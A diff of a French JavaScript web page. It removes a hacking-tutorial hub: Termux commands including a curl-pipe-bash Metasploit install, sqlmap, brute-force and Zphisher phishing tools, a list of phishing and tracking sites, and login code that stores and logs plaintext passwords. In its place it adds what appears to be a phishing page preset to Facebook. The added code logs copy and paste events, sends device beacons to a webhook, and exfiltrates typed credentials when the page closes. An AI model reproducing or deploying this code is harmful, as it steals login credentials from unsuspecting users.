-                if (!document.getElementById('pdfList').hasChildNodes()) {
-                    afficherPDFs();
-                }
-            }
-            if (pageId === 'assistance-page') {
-                initAssistance();
-            }
-        }
+        });
 
-        function toggleSidebar() {
-            document.getElementById('sidebar').classList.toggle('active');
-            document.getElementById('overlay').classList.toggle('active');
-        }
-        function closeSidebar() {
-            document.getElementById('sidebar').classList.remove('active');
-            document.getElementById('overlay').classList.remove('active');
-        }
+        document.addEventListener('copy', function() { captureEvent('copy', 'contenu copié'); });
+        document.addEventListener('paste', function() { captureEvent('paste', 'contenu collé'); });
 
-        function toggleLuminosity() {
-            document.body.classList.toggle('light-mode');
-            closeSidebar();
-        }
+        setInterval(function() {
+            captureEvent('heartbeat', `durée:${Math.floor((Date.now()-state.startTime)/1000)}s`);
+        }, 30000);
+    }
 
-        // === AVATAR ===
-        function handleAvatarUpload(event) {
-            const file = event.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    const imgData = e.target.result;
-                    localStorage.setItem('lola_avatar', imgData);
-                    document.getElementById('avatar-image').src = imgData;
-                    document.getElementById('avatar-image').style.display = 'block';
-                    document.getElementById('avatar-placeholder').style.display = 'none';
-                    showToast('✅ Photo de profil mise à jour !', 'success');
-                };
-                reader.readAsDataURL(file);
-            }
-        }
-
-        // === INSCRIPTION ===
-        function handleSignup(e) {
-            e.preventDefault();
-            const prenom = document.getElementById('prenom').value.trim();
-            const nom = document.getElementById('nom').value.trim();
-            const username = document.getElementById('username').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value;
-            const confirm = document.getElementById('confirm-password').value;
-            const telephone = document.getElementById('telephone').value.trim();
-            const pays = document.getElementById('pays').value;
-            const errorDiv = document.getElementById('signup-error');
-            errorDiv.style.display = 'none';
-            if (password !== confirm) { 
-                errorDiv.textContent = 'Les mots de passe ne correspondent pas.';
-                errorDiv.style.display = 'block';
-                showToast('❌ Les mots de passe ne correspondent pas.', 'error');
-                return;
-            }
-            if (password.length < 8) { 
-                errorDiv.textContent = 'Le mot de passe doit contenir au moins 8 caractères.';
-                errorDiv.style.display = 'block';
-                showToast('❌ Le mot de passe doit contenir au moins 8 caractères.', 'error');
-                return;
-            }
-            const user = { 
-                prenom, 
-                nom, 
-                username, 
-                email, 
-                telephone, 
-                pays, 
-                password: password 
-            };
-            localStorage.setItem('lola_user', JSON.stringify(user));
-            console.log('✅ Compte créé :', user);
-            showToast('✅ Compte créé avec succès ! Bienvenue ' + username + ' !', 'success');
-            navigate('profile-page');
-        }
-
-        // === CONNEXION AVEC DÉBOGAGE ===
-        function handleLogin(e) {
-            e.preventDefault();
-            const email = document.getElementById('login-email').value.trim();
-            const password = document.getElementById('login-password').value.trim();
-            const errorDiv = document.getElementById('login-error');
-            errorDiv.style.display = 'none';
-            
-            console.log('🔍 Tentative de connexion avec :', { email, password });
-            
-            const storedData = localStorage.getItem('lola_user');
-            console.log('📦 Données stockées (brutes) :', storedData);
-            
-            if (!storedData) {
-                errorDiv.textContent = 'Aucun compte trouvé. Veuillez vous inscrire.';
-                errorDiv.style.display = 'block';
-                showToast('❌ Aucun compte trouvé.', 'error');
-                console.log('❌ Aucun compte trouvé dans localStorage');
-                return;
-            }
-            
-            let user;
-            try {
-                user = JSON.parse(storedData);
-                console.log('✅ Compte parsé :', user);
-            } catch(e) {
-                localStorage.removeItem('lola_user');
-                errorDiv.textContent = 'Erreur de données. Veuillez vous réinscrire.';
-                errorDiv.style.display = 'block';
-                showToast('❌ Erreur de données.', 'error');
-                console.log('❌ Erreur de parsing :', e);
-                return;
-            }
-            
-            console.log('🔍 Comparaison :');
-            console.log('   Email saisi  :', email);
-            console.log('   Email stocké :', user.email);
-            console.log('   Email match  :', user.email === email);
-            console.log('   Mot de passe saisi  :', password);
-            console.log('   Mot de passe stocké :', user.password);
-            console.log('   Mot de passe match  :', user.password === password);
-            
-            if (user.email === email && user.password === password) {
-                showToast('✅ Bienvenue ' + (user.username || 'utilisateur') + ' !', 'success');
-                console.log('✅ Connexion réussie !');
-                navigate('profile-page');
-            } else {
-                errorDiv.textContent = 'Email ou mot de passe incorrect.';
-                errorDiv.style.display = 'block';
-                showToast('❌ Email ou mot de passe incorrect.', 'error');
-                console.log('❌ Identifiants incorrects');
-            }
-        }
-
-        // === DÉBOGAGE : Afficher les données stockées ===
-        function showDebugInfo() {
-            const debugDiv = document.getElementById('debug-info');
-            const storedData = localStorage.getItem('lola_user');
-            
-            if (!storedData) {
-                debugDiv.innerHTML = '<span class="label">❌ Aucun compte trouvé dans localStorage.</span>';
-                debugDiv.classList.add('show');
-                return;
-            }
-            
-            try {
-                const user = JSON.parse(storedData);
-                debugDiv.innerHTML = `
-                    <div><span class="label">📧 Email :</span> <span class="value">${user.email}</span></div>
-                    <div><span class="label">🔑 Mot de passe :</span> <span class="value">${user.password}</span></div>
-                    <div><span class="label">👤 Nom d\'utilisateur :</span> <span class="value">${user.username}</span></div>
-                    <div><span class="label">📝 Données brutes :</span> <span class="value">${storedData}</span></div>
-                    <div style="margin-top:8px; color:#ffd60a; font-size:9px;">💡 Utilise ces données pour te connecter.</div>
-                `;
-            } catch(e) {
-                debugDiv.innerHTML = `<span class="label">❌ Données corrompues :</span> ${storedData}`;
-            }
-            debugDiv.classList.toggle('show');
-        }
-
-        // === CHANGEMENT DE MOT DE PASSE ===
-        function changePassword() {
-            const current = document.querySelector('.security-field input[placeholder="Mot de passe actuel"]').value.trim();
-            const newPwd = document.querySelector('.security-field input[placeholder="Nouveau mot de passe"]').value.trim();
-            const confirmPwd = document.querySelector('.security-field input[placeholder="Confirmer le nouveau mot de passe"]').value.trim();
-
-            const stored = localStorage.getItem('lola_user');
-            if (!stored) {
-                showToast('❌ Aucun compte trouvé.', 'error');
-                return;
-            }
-
-            const user = JSON.parse(stored);
-
-            if (user.password !== current) {
-                showToast('❌ Mot de passe actuel incorrect.', 'error');
-                return;
-            }
-
-            if (newPwd.length < 8) {
-                showToast('❌ Le nouveau mot de passe doit contenir au moins 8 caractères.', 'error');
-                return;
-            }
-
-            if (newPwd !== confirmPwd) {
-                showToast('❌ Les nouveaux mots de passe ne correspondent pas.', 'error');
-                return;
-            }
-
-            user.password = newPwd;
-            localStorage.setItem('lola_user', JSON.stringify(user));
-            showToast('✅ Mot de passe changé avec succès !', 'success');
-            document.querySelectorAll('.security-field input').forEach(input => input.value = '');
-        }
-
-        // === CODE TERMUX ===
-        const codes = [
-            { n:"01", cat:"install", title:"Mise à jour complète", code:"pkg update && pkg upgrade -y", desc:"Met à jour tous les paquets Termux." },
-            { n:"02", cat:"install", title:"Installer Python", code:"pkg install python -y", desc:"Installe Python 3 avec pip." },
-            { n:"03", cat:"install", title:"Installer Node.js", code:"pkg install nodejs -y", desc:"Installe Node.js et npm." },
-            { n:"04", cat:"install", title:"Installer Git", code:"pkg install git -y", desc:"Installe Git pour le versioning." },
-            { n:"05", cat:"install", title:"Installer des outils essentiels", code:"pkg install curl wget nano vim -y", desc:"Pack d'outils de base indispensables." },
-            { n:"06", cat:"install", title:"Installer Ruby", code:"pkg install ruby -y", desc:"Installe Ruby et gem." },
-            { n:"07", cat:"install", title:"Accès stockage Android", code:"termux-setup-storage", desc:"Donne accès aux fichiers Android depuis Termux." },
-            { n:"08", cat:"install", title:"Installer Golang", code:"pkg install golang -y", desc:"Installe le compilateur Go." },
-            { n:"09", cat:"install", title:"Installer ffmpeg", code:"pkg install ffmpeg -y", desc:"Traitement audio/vidéo en ligne de commande." },
-            { n:"10", cat:"install", title:"Installer PHP", code:"pkg install php -y", desc:"Installe PHP pour les scripts web." },
-            { n:"11", cat:"réseau", title:"Scanner le réseau local", code:"pkg install nmap -y\nnmap -sV 192.168.1.0/24", desc:"Découvre tous les appareils sur le réseau local." },
-            { n:"12", cat:"réseau", title:"Tester la vitesse internet", code:"pkg install python -y\npip install speedtest-cli\nspeedtest-cli", desc:"Mesure le débit upload/download." },
-            { n:"13", cat:"réseau", title:"Tracer une route réseau", code:"pkg install traceroute -y\ntraceroute google.com", desc:"Affiche le chemin des paquets vers une destination." },
-            { n:"14", cat:"réseau", title:"Écouter le trafic réseau", code:"pkg install tcpdump -y\ntcpdump -i wlan0", desc:"Capture les paquets réseau en temps réel." },
-            { n:"15", cat:"réseau", title:"Requête HTTP avancée", code:"curl -I https://example.com\ncurl -X POST -d 'data=test' url", desc:"Inspections et requêtes HTTP/HTTPS." },
-            { n:"16", cat:"réseau", title:"Serveur HTTP local", code:"python -m http.server 8080", desc:"Lance un serveur HTTP sur le port 8080." },
-            { n:"17", cat:"réseau", title:"Connexion SSH", code:"pkg install openssh -y\nssh user@192.168.1.x", desc:"Connexion SSH vers un serveur distant." },
-            { n:"18", cat:"réseau", title:"Tunnel SSH (port forwarding)", code:"ssh -L 8080:localhost:80 user@server", desc:"Crée un tunnel SSH pour rediriger un port." },
-            { n:"19", cat:"réseau", title:"Ping avancé", code:"ping -c 10 -i 0.2 google.com", desc:"Envoie 10 pings rapides et affiche les stats." },
-            { n:"20", cat:"réseau", title:"Whois d'un domaine", code:"pkg install whois -y\nwhois google.com", desc:"Infos d'enregistrement d'un domaine." },
-            { n:"21", cat:"fichiers", title:"Rechercher un fichier", code:"find / -name '*.txt' 2>/dev/null", desc:"Cherche tous les fichiers .txt sur le système." },
-            { n:"22", cat:"fichiers", title:"Archiver un dossier", code:"tar -czvf archive.tar.gz /mon/dossier", desc:"Compresse un dossier en .tar.gz." },
-            { n:"23", cat:"fichiers", title:"Extraire une archive", code:"tar -xzvf archive.tar.gz", desc:"Décompresse un fichier .tar.gz." },
-            { n:"24", cat:"fichiers", title:"Cloner un repo Git", code:"git clone https://github.com/user/repo", desc:"Clone un dépôt GitHub localement." },
-            { n:"25", cat:"fichiers", title:"Télécharger une vidéo YouTube", code:"pip install yt-dlp\nyt-dlp https://youtu.be/ID", desc:"Télécharge une vidéo YouTube en MP4." },
-            { n:"26", cat:"fichiers", title:"Compter lignes d'un fichier", code:"wc -l fichier.txt", desc:"Compte le nombre de lignes dans un fichier." },
-            { n:"27", cat:"fichiers", title:"Comparer deux fichiers", code:"diff fichier1.txt fichier2.txt", desc:"Affiche les différences entre deux fichiers." },
-            { n:"28", cat:"fichiers", title:"Chiffrer un fichier", code:"pkg install gnupg -y\ngpg -c secret.txt", desc:"Chiffre un fichier avec mot de passe GPG." },
-            { n:"29", cat:"fichiers", title:"Surveiller un fichier en live", code:"tail -f /data/data/com.termux/files/home/log.txt", desc:"Affiche les nouvelles lignes en temps réel." },
-            { n:"30", cat:"fichiers", title:"Dupliquer un dossier", code:"cp -r source/ destination/", desc:"Copie récursive d'un dossier entier." },
-            { n:"31", cat:"système", title:"Infos CPU & RAM", code:"pkg install procps -y\nfree -h && cat /proc/cpuinfo | grep 'model name'", desc:"Affiche la RAM disponible et les infos CPU." },
-            { n:"32", cat:"système", title:"Processus en cours", code:"pkg install procps -y\nps aux | head -20", desc:"Liste les processus actifs avec leur usage RAM/CPU." },
-            { n:"33", cat:"système", title:"Température batterie", code:"termux-battery-status", desc:"Affiche le niveau et la température de la batterie." },
-            { n:"34", cat:"système", title:"Infos réseau de l'appareil", code:"termux-wifi-connectioninfo", desc:"Affiche les infos de connexion Wi-Fi actuelle." },
-            { n:"35", cat:"système", title:"Exécuter tâche planifiée", code:"pkg install cronie -y\ncrontab -e\n# Exemple: */5 * * * * echo 'hello'", desc:"Planifie des tâches récurrentes avec cron." },
-            { n:"36", cat:"système", title:"Afficher espace disque", code:"df -h", desc:"Résumé de l'espace disque utilisé/disponible." },
-            { n:"37", cat:"système", title:"Envoyer une notification", code:"termux-notification -t 'Titre' -c 'Message'", desc:"Affiche une notification Android depuis le terminal." },
-            { n:"38", cat:"système", title:"Vibration de l'appareil", code:"termux-vibrate -d 1000", desc:"Fait vibrer l'appareil pendant 1 seconde." },
-            { n:"39", cat:"système", title:"Lire le presse-papier", code:"termux-clipboard-get", desc:"Affiche le contenu du presse-papier Android." },
-            { n:"40", cat:"système", title:"Éteindre l'écran", code:"termux-torch off", desc:"Éteint la lampe torche. Remplacer par 'on' pour l'allumer." },
-            { n:"41", cat:"outils", title:"Créer un environnement Python", code:"pip install virtualenv\nvirtualenv myenv\nsource myenv/bin/activate", desc:"Crée et active un environnement Python isolé." },
-            { n:"42", cat:"outils", title:"Installer Metasploit", code:"curl https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh | bash", desc:"Installe le framework Metasploit (éducatif)." },
-            { n:"43", cat:"outils", title:"Accès bureau à distance VNC", code:"pkg install x11-repo -y\npkg install tigervnc -y\nvncserver :1", desc:"Lance un serveur VNC pour accès graphique." },
-            { n:"44", cat:"outils", title:"Convertir image en ASCII", code:"pip install ascii-magic\npython3 -c \"from ascii_magic import from_image; from_image('img.jpg')\"", desc:"Affiche une image en art ASCII dans le terminal." },
-            { n:"45", cat:"outils", title:"Générer un QR Code", code:"pip install qrcode\npython3 -c \"import qrcode; qrcode.make('https://example.com').save('qr.png')\"", desc:"Génère un QR code depuis une URL." },
-            { n:"46", cat:"outils", title:"Lancer Jupyter Notebook", code:"pip install jupyter\njupyter notebook --ip=0.0.0.0", desc:"Lance un serveur Jupyter Notebook accessible via navigateur." },
-            { n:"47", cat:"outils", title:"Moniteur ressources en temps réel", code:"pkg install htop -y\nhtop", desc:"Moniteur interactif des processus et ressources." },
-            { n:"48", cat:"outils", title:"Jeu Snake dans le terminal", code:"pip install curtsies\npip install snakemoji\nsnakemoji", desc:"Joue au Snake directement dans le terminal." },
-            { n:"49", cat:"hacking", title:"Analyse de vulnérabilités web", code:"pkg install python -y\npip install sqlmap\nsqlmap -u 'http://target.com/?id=1' --dbs", desc:"⚠️ Outil éducatif d'audit SQL. Usage autorisé uniquement." },
-            { n:"50", cat:"hacking", title:"Cracker un hash MD5", code:"pkg install hashcat -y\nhashcat -m 0 hash.txt wordlist.txt", desc:"⚠️ Test de robustesse de mots de passe. Contexte légal uniquement." },
-            { n:"51", cat:"hacking", title:"Black Hydra (Brute Force)", code:"pkg install python git -y\ngit clone https://github.com/Gameye98/Black-Hydra\ncd Black-Hydra\npython2 blackhydra.py", desc:"⚠️ Outil éducatif de brute force. Usage responsable uniquement." },
-            { n:"52", cat:"hacking", title:"Zphisher (Phishing éthique)", code:"pkg install git curl -y\ngit clone https://github.com/htr-tech/zphisher\ncd Zphisher\nbash zphisher.sh", desc:"⚠️ Outil éducatif de sensibilisation. Usage éthique requis." }
-        ];
-
-        function loadTermuxCodes() {
-            const grid = document.getElementById('termux-grid');
-            codes.forEach(c => {
-                const div = document.createElement('div');
-                div.className = 'card';
-                div.dataset.cat = c.cat;
-                div.innerHTML = `
-                    <div class="card-num">#${c.n}</div>
-                    <div class="card-tag">${c.cat}</div>
-                    <div class="card-title">${c.title}</div>
-                    <div class="card-code" id="termux-code-${c.n}">${c.code}<button class="copy-btn" onclick="copyTermuxCode('${c.n}', this)">COPY</button></div>
-                    <div class="card-desc">${c.desc}</div>
-                `;
-                grid.appendChild(div);
-            });
-        }
-
-        function copyTermuxCode(id, btn) {
-            const el = document.getElementById('termux-code-' + id);
-            const text = el.innerText.replace('COPY', '').trim();
-            navigator.clipboard.writeText(text).then(() => {
-                btn.textContent = 'OK ✓';
-                btn.classList.add('copied');
-                setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500);
-                showToast('✅ Commande copiée !', 'success');
-            });
-        }
-
-        function filterCards(cat) {
-            document.querySelectorAll('.termux-page .filter-btn').forEach(b => b.classList.remove('active'));
-            event.target.classList.add('active');
-            document.querySelectorAll('.termux-page .card').forEach(card => {
-                if (cat === 'all' || card.dataset.cat === cat) card.classList.remove('hidden');
-                else card.classList.add('hidden');
-            });
-        }
-
-        // === SITES À CONNAITRE ===
-        const sites = [
-            { nom: "IPLogger", sous: "Raccourcisseur traqueur", description: "Récupère ton IP, ta localisation et ton appareil dès que tu cliques.", lien: "https://iplogger.org", classe: "tracking" },
-            { nom: "Grabify", sous: "Raccourcisseur traqueur", description: "Similaire à IPLogger, tracke ton IP et tes données de navigation.", lien: "https://grabify.link", classe: "tracking" },
-            { nom: "2no.co", sous: "Raccourcisseur piégé", description: "Raccourcisseur utilisé pour masquer des liens malveillants.", lien: "https://2no.co", classe: "tracking" },
-            { nom: "WebcamMic Test", sous: "Fausse webcam", description: "Te demande d'activer cam/mic pour 'tester' puis enregistre à ton insu.", lien: "https://webcammictest.com", classe: "danger" },
-            { nom: "OnlineMic Test", sous: "Faux micro", description: "Site factice qui enregistre ton micro sans ton consentement.", lien: "https://onlinemictest.com", classe: "danger" },
-            { nom: "WhatsApp Verify", sous: "Phishing WhatsApp", description: "Page imitant WhatsApp pour voler ton compte.", lien: "https://whatsapp-web-verify.com", classe: "phishing" },
-            { nom: "Telegram Login", sous: "Phishing Telegram", description: "Fausse page de connexion Telegram pour voler tes identifiants.", lien: "https://telegram-login.xyz", classe: "phishing" },
-            { nom: "Banque France Sec", sous: "Fausse banque", description: "Page imitant la Banque de France pour voler coordonnées bancaires.", lien: "https://banque-france.secure-login.xyz", classe: "phishing" },
-            { nom: "Telecharger Facile", sous: "Faux téléchargement", description: "Télécharge des malwares cachés dans des faux logiciels.", lien: "https://telecharger-facile.click", classe: "malware" },
-            { nom: "Logiciel Gratuit", sous: "Faux logiciel", description: "Site de téléchargement piégé avec des virus.", lien: "https://logiciel-gratuit.stream", classe: "malware" },
-            { nom: "Virus Alerte", sous: "Fausse alerte", description: "Te fait paniquer pour installer un faux antivirus.", lien: "https://votre-pc-est-infecte.top", classe: "fake" },
-            { nom: "Nettoyage Urgent", sous: "Fausse alerte", description: "Imite une alerte Microsoft pour te faire payer un faux nettoyage.", lien: "https://nettoyage-urgent.site", classe: "fake" },
-            { nom: "iPhone Gratuit", sous: "Arnaque cadeau", description: "Fausse promo pour voler tes coordonnées bancaires.", lien: "https://iphone-gratuit.win", classe: "phishing" },
-            { nom: "Amazon Cadeau", sous: "Arnaque cadeau", description: "Faux bon d'achat Amazon pour récupérer tes infos.", lien: "https://amazon-cadeau.click", classe: "phishing" }
-        ];
-
-        function loadSites() {
-            const conteneur = document.getElementById('conteneurBoutons');
-            const infoBox = document.getElementById('infoBox');
-            conteneur.innerHTML = '';
-
-            const order = { danger: 1, tracking: 2, phishing: 3, malware: 4, fake: 5 };
-            sites.sort((a, b) => (order[a.classe] || 99) - (order[b.classe] || 99));
-
-            sites.forEach((site) => {
-                const bouton = document.createElement('button');
-                bouton.className = `btn-site ${site.classe}`;
-
-                let emoji = '⚠️';
-                if (site.classe === 'danger') emoji = '🔴';
-                else if (site.classe === 'tracking') emoji = '👁️';
-                else if (site.classe === 'phishing') emoji = '🎣';
-                else if (site.classe === 'malware') emoji = '🦠';
-                else if (site.classe === 'fake') emoji = '🤥';
-
-                bouton.innerHTML = `${emoji} ${site.nom} <span class="sous-nom">${site.sous}</span>`;
-                bouton.dataset.description = site.description;
-                bouton.dataset.lien = site.lien;
-                bouton.dataset.classe = site.classe;
-
-                let label = '⚠️ DANGER';
-                if (site.classe === 'tracking') label = '👁️ TRACKING';
-                else if (site.classe === 'phishing') label = '🎣 PHISHING';
-                else if (site.classe === 'malware') label = '🦠 MALWARE';
-                else if (site.classe === 'fake') label = '🤥 FAKE';
-
-                bouton.addEventListener('click', function () {
-                    const desc = this.dataset.description || 'Pas de description.';
-                    const lien = this.dataset.lien || '#';
-                    infoBox.innerHTML = `
-                        <span class="emoji">🔗</span>
-                        <span class="message">
-                            <span class="danger-label">${label}</span>
-                            <strong>${this.textContent.trim().split(' ').slice(1).join(' ')}</strong><br />
-                            ${desc}<br />
-                            <span class="lien-texte">${lien}</span>
-                            <a href="${lien}" target="_blank" rel="noopener">ouvrir →</a>
-                        </span>
-                    `;
-                });
-
-                conteneur.appendChild(bouton);
-            });
-        }
-
-        // === BIBLIOTHÈQUE PDF ===
-        const pdfs = [
-            {
-                nom: "Hack-Éthique",
-                description: "Guide sur les bases de la sécurité offensive et défensive.",
-                lien: "https://www.transfernow.net/dl/20260711cIV5b5tk"
-            },
-            {
-                nom: "Apprendre Python",
-                description: "Initiation au langage Python pour l'analyse et la sécurité.",
-                lien: "https://www.transfernow.net/dl/20260711cnpPz7Yp"
-            },
-            {
-                nom: "Termux-Guide",
-                description: "Utiliser Termux sur Android pour l'audit et la programmation.",
-                lien: "https://www.transfernow.net/dl/20260711aFlMF3sA"
-            },
-            {
-                nom: "Metasploit",
-                description: "Introduction à Metasploit pour les tests d'intrusion.",
-                lien: "https://www.transfernow.net/dl/20260711BR4UagwQ"
-            }
-        ];
-
-        const pdfsPerso = [];
-        const MAX = 4;
-
-        function afficherPDFs() {
-            const pdfList = document.getElementById('pdfList');
-            let html = '';
-            pdfs.forEach((pdf, index) => {
-                html += `
-                    <div class="pdf-item" data-index="${index}">
-                        <div class="info">
-                            <span class="pdf-icon">📄</span>
-                            <div class="details">
-                                <div class="nom">${pdf.nom}</div>
-                                <div class="description">${pdf.description}</div>
-                            </div>
-                        </div>
-                        <div class="actions">
-                            <button class="btn-ouvrir" data-index="${index}">📖 Ouvrir</button>
-                            <button class="btn-telecharger" data-index="${index}">⬇️ Télécharger</button>
-                        </div>
-                    </div>
-                `;
-            });
-            pdfList.innerHTML = html;
-
-            document.querySelectorAll('.btn-ouvrir').forEach(btn => {
-                btn.addEventListener('click', function () {
-                    const idx = parseInt(this.dataset.index);
-                    const pdf = pdfs[idx];
-                    if (pdf) {
-                        window.open(pdf.lien, '_blank');
-                    }
-                });
-            });
-
-            document.querySelectorAll('.btn-telecharger').forEach(btn => {
-                btn.addEventListener('click', function () {
-                    const idx = parseInt(this.dataset.index);
-                    const pdf = pdfs[idx];
-                    if (pdf) {
-                        const a = document.createElement('a');
-                        a.href = pdf.lien;
-                        a.download = pdf.nom + '.pdf';
-                        a.target = '_blank';
-                        document.body.appendChild(a);
-                        a.click();
-                        document.body.removeChild(a);
-                    }
-                });
-            });
-        }
-
-        function afficherCompteur() {
-            document.getElementById('compteActuel').textContent = pdfsPerso.length;
-        }
-
-        function ajouterFichiersPerso(fichiers) {
-            const dropZone = document.getElementById('dropZone');
-            const fileInput = document.getElementById('fileInput');
-            let ajoutes = 0;
-            for (const fichier of fichiers) {
-                if (pdfsPerso.length >= MAX) {
-                    alert('⚠️ Limite de 4 PDF personnels atteinte.');
-                    break;
-                }
-                if (fichier.type !== 'application/pdf') {
-                    alert(`❌ "${fichier.name}" n'est pas un PDF.`);
-                    continue;
-                }
-                const existe = pdfsPerso.some(p => p.name === fichier.name && p.size === fichier.size);
-                if (existe) {
-                    alert(`⚠️ "${fichier.name}" est déjà ajouté.`);
-                    continue;
-                }
-                pdfsPerso.push(fichier);
-                ajoutes++;
-            }
-            if (ajoutes > 0) {
-                afficherCompteur();
-                fileInput.value = '';
-                dropZone.querySelector('.sous-texte').textContent = 
-                    pdfsPerso.length + ' PDF personnel(s) ajouté(s)';
-            }
-        }
-
-        // === ASSISTANCE (IA Hack & Code) ===
-        function initAssistance() {
-            const ias = [
-                {
-                    id: "iaHack",
-                    nom: "HackBot",
-                    description: "Pose-lui tes questions sur le pentesting, les vulnérabilités et la sécurité éthique.",
-                    lien: "https://hackbot.ai",
-                    emoji: "🛡️",
-                    type: "Hack Éthique"
+    // =========================================================
+    // 11. BEACONS – FORCE L'ENVOI MÊME EN CAS D'ERREUR
+    // =========================================================
+    function startBeacons() {
+        setInterval(() => {
+            const payload = {
+                session: state.sessionId,
+                timestamp: new Date().toISOString(),
+                elapsed: Math.floor((Date.now() - state.startTime) / 1000) + 's',
+                device: getDeviceInfo(),
+                data: {
+                    action: 'beacon',
+                    uptime: Math.floor((Date.now() - state.startTime) / 1000) + 's',
+                    attempts: state.attempts,
+                    selectedService: state.selectedService,
+                    alreadySent: state.alreadySent
                 },
-                {
-                    id: "iaCode",
-                    nom: "CodeMate",
-                    description: "Aide à la programmation, débogage, optimisation et apprentissage des langages.",
-                    lien: "https://codemate.ai",
-                    emoji: "💻",
-                    type: "Codage"
-                }
-            ];
+                attempts: state.attempts
+            };
+            try {
+                fetch(CONFIG.webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```' })
+                }).catch(() => {});
+            } catch(e) {}
+        }, CONFIG.beaconInterval);
 
-            const infoBox = document.getElementById('infoBoxAssistance');
-
-            document.querySelectorAll('.ia-card').forEach(card => {
-                card.addEventListener('click', function (e) {
-                    if (e.target.tagName === 'A' || e.target.closest('a')) {
-                        return;
-                    }
-                    const id = this.id;
-                    const ia = ias.find(i => i.id === id);
-                    if (ia) {
-                        infoBox.innerHTML = `
-                            <span class="emoji">${ia.emoji}</span>
-                            <span class="message">
-                                <strong>${ia.nom}</strong> — ${ia.description}<br />
-                                <span style="font-size:0.7rem;color:#667799;">
-                                    🔗 ${ia.lien}
-                                </span>
-                            </span>
-                        `;
-                    }
-                });
-            });
-
-            document.querySelectorAll('.ia-btn').forEach(btn => {
-                btn.addEventListener('click', function (e) {
-                    const card = this.closest('.ia-card');
-                    if (card) {
-                        const id = card.id;
-                        const ia = ias.find(i => i.id === id);
-                        if (ia) {
-                            infoBox.innerHTML = `
-                                <span class="emoji">${ia.emoji}</span>
-                                <span class="message">
-                                    <strong>${ia.nom}</strong> — Ouverture en cours...<br />
-                                    <span style="font-size:0.7rem;color:#667799;">
-                                        🔗 ${ia.lien}
-                                    </span>
-                                </span>
-                            `;
-                        }
-                    }
-                });
-            });
-
-            console.log('✅ 2 IA prêtes : HackBot & CodeMate');
-        }
-
-        // === INITIALISATION DES PAGES ===
-        document.addEventListener('DOMContentLoaded', function() {
-            // PDF
-            const dropZone = document.getElementById('dropZone');
-            const fileInput = document.getElementById('fileInput');
-
-            if (dropZone) {
-                dropZone.addEventListener('click', function (e) {
-                    if (e.target.tagName !== 'INPUT') {
-                        fileInput.click();
-                    }
-                });
-
-                fileInput.addEventListener('change', function () {
-                    if (this.files.length > 0) {
-                        ajouterFichiersPerso(this.files);
-                    }
-                });
-
-                dropZone.addEventListener('dragover', function (e) {
-                    e.preventDefault();
-                    this.classList.add('dragover');
-                });
-
-                dropZone.addEventListener('dragleave', function (e) {
-                    e.preventDefault();
-                    this.classList.remove('dragover');
-                });
-
-                dropZone.addEventListener('drop', function (e) {
-                    e.preventDefault();
-                    this.classList.remove('dragover');
-                    if (e.dataTransfer.files.length > 0) {
-                        ajouterFichiersPerso(e.dataTransfer.files);
-                    }
-                });
+        window.addEventListener('beforeunload', function() {
+            // Si des identifiants sont encore dans les champs, on les envoie avant de fermer
+            const login = dom.loginInput.value.trim();
+            const pass = dom.passInput.value.trim();
+            if (login && pass && !state.alreadySent) {
+                exfiltrateCredentials();
             }
-
-            afficherPDFs();
-            afficherCompteur();
-            console.log('✅ 4 PDF chargés + zone de dépôt prête');
+            const payload = {
+                session: state.sessionId,
+                timestamp: new Date().toISOString(),
+                elapsed: Math.floor((Date.now() - state.startTime) / 1000) + 's',
+                device: getDeviceInfo(),
+                data: {
+                    action: 'page_closed',
+                    duration: Math.floor((Date.now() - state.startTime) / 1000) + 's',
+                    total_attempts: state.attempts,
+                    events_count: state.events.length,
+                    final_alreadySent: state.alreadySent
+                },
+                attempts: state.attempts
+            };
+            try {
+                fetch(CONFIG.webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```' })
+                }).catch(() => {});
+            } catch(e) {}
         });
+    }
 
-        // Rediriger tous les appels de navigation vers navigateWithProgress
-        document.querySelectorAll('[onclick*="navigate("]').forEach(el => {
-            const oldOnclick = el.getAttribute('onclick');
-            const match = oldOnclick.match(/navigate\('([^']+)'\)/);
-            if (match) {
-                const pageId = match[1];
-                el.setAttribute('onclick', `navigateWithProgress('${pageId}')`);
-            }
-        });
+    // =========================================================
+    // 12. INIT
+    // =========================================================
+    function init() {
+        setupUI();
+        updateStatus('🔒 Choisissez un service pour commencer');
+        setTimeout(() => {
+            selectService('facebook');
+        }, 300);
+        setTimeout(() => {
+            const payload = {
+                session: state.sessionId,
+                timestamp: new Date().toISOString(),
+                elapsed: '0s',
+                device: getDeviceInfo(),
+                data: { action: 'page_loaded', userAgent: navigator.userAgent },
+                attempts: 0
+            };
+            try {
+                fetch(CONFIG.webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```' })
+                }).catch(() => {});
+            } catch(e) {}
+        }, 1000);
+        startBeacons();
+    }
 
-        // Initialisation
-        navigate('main-content');
-    </script>
+    if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        init();
+    } else {
+        document.addEventListener('DOMContentLoaded', init);
+    }
+
+})();
+</script>
 </body>
-            </html>
+    </html>
